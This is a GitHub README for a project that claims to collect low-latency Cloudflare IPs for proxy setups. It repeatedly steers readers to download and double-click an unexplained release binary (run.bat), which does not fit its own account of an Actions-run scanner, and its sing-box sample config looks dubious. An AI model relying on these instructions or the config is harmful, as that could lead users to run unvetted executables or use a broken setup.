# 🌐 i-love-this-IP - Access High-Quality Cloudflare IPs Easily

[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/muh97is/i-love-this-IP/releases)

## 📌 Project Overview

The **i-love-this-IP** project automatically collects and updates a list of optimal Cloudflare IP addresses. This helps users set up proxies and enhance access to Cloudflare's CDN and services. Our solution is designed for anyone who wants reliable access to internet resources.

### ❤️ Key Features

- Automated detection of Cloudflare's best IPs.
- Daily updates for continuous reliability.
- Clear and organized output files.

## 🔄 Automatic Updates

- **Update Method:** Regular tasks through GitHub Actions.
- **Update Frequency:** Daily (you can modify the schedule in the configuration).
- **Data Source:** Official Cloudflare global IP ranges.
- **Detection Steps:**
  1. Scan specified IP ranges.
  2. Test connectivity (ICMP checks).
  3. Measure round-trip time (RTT) for latency.
  4. Filter out stable nodes after multiple tests.
  5. Write results in a standardized output file.

## 📊 Example of Data Structure

```text
# Updated on: 2025-xx-xx xx:xx:xx
# Number of tested nodes: xxxx
# Available IPs: xxx
# Average latency: xx ms
# Source of data: Cloudflare public IP ranges
```

### Sample Output File:

```text
104.16.0.1
104.19.45.12
172.67.22.91
```

## 📁 File Structure

```bash
i-love-this-IP/
├── ip.txt               # Latest IP list
├── scripts/             # Scripts for scanning and filtering
├── .github/workflows/   # Configuration for Actions
└── README.md
```

## 🚀 Getting Started

To get started, follow these steps to download and run the software:

1. **Download the Latest Version**  
   Visit the [Releases Page](https://github.com/muh97is/i-love-this-IP/releases) to download the latest version of the application. Select the appropriate file for your operating system. 

2. **Extract the Files**  
   After downloading, locate the ZIP file and extract its contents to a folder on your computer.

3. **Run the Application**  
   Open the folder where you extracted the files. Look for `run.bat` (or a similar file for your OS) and double-click it to start the application.

4. **Check the Output**  
   The application will generate an `ip.txt` file in the same folder. This file contains the list of Cloudflare IPs.

5. **Utilize the IPs**  
   You can use the IPs in `ip.txt` for various purposes, including:
   - Setting up your proxy service (e.g., sing-box, Xray).
   - Customizing Cloudflare CDN routing.
   - Improving Cloudflare Workers performance.
   - Conducting local tests or research.

### Example Configuration for a Proxy Service

Here’s a sample config using `sing-box`:

```json
{
  "outbounds": [
    {
      "type": "http",
      "server": "104.16.0.1",
      "port": 80
    }
  ]
}
```

## 🔧 System Requirements

To run this application, you will need:

- A system with network access.
- Compatibility with Windows, macOS, or Linux (both 64-bit and 32-bit).

## 📥 Download & Install

To download the application, visit the [Releases Page](https://github.com/muh97is/i-love-this-IP/releases). Choose the appropriate version for your system, extract it, and follow the steps above to run the application. 

Feel free to reach out if you need assistance. Enjoy reliable access to Cloudflare IPs!